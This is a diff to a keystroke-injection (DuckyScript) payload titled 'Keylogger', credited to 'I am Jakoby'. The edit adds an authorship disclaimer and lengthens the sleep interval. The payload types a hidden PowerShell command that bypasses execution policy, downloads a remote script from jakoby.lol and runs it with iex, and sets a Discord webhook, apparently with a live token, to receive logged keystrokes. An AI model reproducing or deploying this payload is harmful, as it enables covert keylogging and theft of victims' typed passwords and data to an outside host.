@@ -1,4 +1,7 @@
-REM     Title: Keylogger
+REM     
+THIS IS JAKOBY's PAYLOAD NOT MINE I JUST EDDIT IT
+
+Title: Keylogger
 
 REM     Author: I am Jakoby
 
@@ -21,5 +24,5 @@ REM     $dc='https://link.iamjakoby.com/xxxx';$log="09:00 pm";$ks="12/25/2022 10
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass -command "while($true){$dc='https://discord.com/api/webhooks/1504330161179328533/xgbxpkDpcffgAL8_wjuIDrKiqBog5ozhbbcdE5f9YI9HYUJX02OFywqg1kgV5jct_El8';iwr 'https://jakoby.lol/m2m' | iex; Start-Sleep -s 60}"
+STRING powershell -w h -NoP -Ep Bypass -command "while($true){$dc='https://discord.com/api/webhooks/1504330161179328533/xgbxpkDpcffgAL8_wjuIDrKiqBog5ozhbbcdE5f9YI9HYUJX02OFywqg1kgV5jct_El8';iwr 'https://jakoby.lol/m2m' | iex; Start-Sleep -s 600}"
 ENTER
